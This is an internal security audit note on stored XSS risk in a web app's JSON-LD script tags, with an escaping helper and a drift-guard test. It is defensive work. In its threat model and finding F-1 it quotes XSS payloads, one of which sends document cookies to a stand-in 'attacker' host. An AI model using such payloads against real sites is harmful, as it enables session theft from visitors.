# Lane 4.46 — JSON-LD XSS audit (DB-controllable strings in `<script type="application/ld+json">`)

**Status:** Defense-in-depth fix shipped. Not currently exploitable — anon writes to `tools` are RLS-blocked — but every dangerouslySetInnerHTML+JSON.stringify+`<script>` pair is a stored-XSS waiting for one RLS gap.
**Severity:** P3 (defense-in-depth) → would be P0 the moment any anon-write path opens against `tools`/`composites`/`category_beliefs`/etc.
**Date:** 2026-04-28
**Sibling lanes:** 4.34 (RLS coverage matrix), 4.16 (anon WRITE grants), 4.6 (server-component anon-client audit), 4.10 (showcase-page hardcoded JWT — Hard Rule #54).

## Threat model

`<script type="application/ld+json">` content is inert as JavaScript — browsers do NOT execute it. But the HTML tokenizer still scans the script body for the literal sequence `</script` (case-insensitive) to find the script's end tag. Hit it inside a JSON-LD payload and:

1. The script element terminates early.
2. Everything after the unintended `</script>` is parsed as HTML.
3. An attacker who controls any string field that lands in the JSON-LD payload (e.g. `tool.name`, `tool.description`, FAQ answers, blog post bodies) can inject `</script><img src=x onerror=alert(1)>` and ship stored DOM XSS.

JSON.stringify does NOT escape `<` or `>`. The only safe encoding inside a `<script>` body is to escape `<`, `>` (and defensively `&`) to their `\uXXXX` sequences — JSON parsers decode them back, so consumers (Google, schema.org validators) see the original string, but the HTML tokenizer never sees a literal `<`.

## Findings

### F-1 — Tool detail page reflects DB-controllable name+description into JSON-LD (FIXED via helper)

`src/app/tools/[slug]/page.tsx` builds a SoftwareApplication JSON-LD object using `tool.name` and `tool.description` (loaded from Supabase via `getToolBySlug`), then renders:

```tsx
<script type="application/ld+json"
  dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }} />
```

If any future migration permits anon WRITEs to `tools`, or a privileged user has their session compromised, a malicious `name` of `</script><svg/onload=fetch('https://attacker/'+document.cookie)>` becomes a stored XSS on every visitor of every tool page on toolroute.ai.

**Currently not exploitable** because `tools` RLS allows only `service_role` writes (verified Lane 4.10 / 4.16 / 4.34) — but defense in depth: the bug class survives any future RLS regression.

### F-2 — Same pattern across 60+ public pages (FIXED mechanically)

Every page that injects JSON-LD followed the identical anti-pattern: `dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}`. Pages affected (partial list):

- `/tools/[slug]`, `/tools`, `/discover`, `/compare`
- All `/blog/*` posts (~30 files)
- `/category/*`, `/protocols/*`, `/alternatives/[tool]`
- `/agents`, `/integrations`, `/playground`, `/glossary`, `/faq`, `/pricing`, `/skills`, `/composites`
- `/docs/*`
- Root `app/layout.tsx`

Most of these pull strings from compile-time constants today, but blog posts increasingly pull from DB and the layout pulls dynamic site config — all are one feature change away from rendering DB-controllable content.

## Fix

### `src/lib/json-ld.ts` (NEW)

```ts
export function safeJsonLd(payload: unknown): string {
  return JSON.stringify(payload)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026");
}
```

### Mechanical conversion (61 files)

Every `dangerouslySetInnerHTML={{ __html: JSON.stringify(X) }}` inside a `<script type="application/ld+json">` was rewritten to `dangerouslySetInnerHTML={{ __html: safeJsonLd(X) }}` plus `import { safeJsonLd } from "@/lib/json-ld";`.

Python regex script handled 60 files. `src/app/compare/page.tsx` had `JSON.stringify(jsonLd())` (function call inside parens) — script's regex didn't match nested parens, so it was fixed by hand.

## Drift guard

`tests/unit/jsonld-xss-helper.test.ts` walks `src/` and fails if any `dangerouslySetInnerHTML={{ __html: JSON.stringify(...)` pattern exists anywhere in source. Forces all future JSON-LD authors to either use `safeJsonLd` or open a discussion about why their case is special.

## Verification

```bash
npx tsc --noEmit
npx vitest run tests/unit/jsonld-xss-helper.test.ts
```

## Sibling rules / Hard Rules

- Hard Rule #54 (showcase pages with hardcoded JWTs) — same class: code that BUILDS knows it's safe today, ignores the surface it creates for tomorrow.
- Hard Rule #59 (failing-snapshot test as drift TODO) — drift guard pattern.
- Lane 4.6 (anon-client in server-components pre-lockdown audit) — sibling: a server-side fetch that today is safe becomes unsafe the moment auth assumptions change.
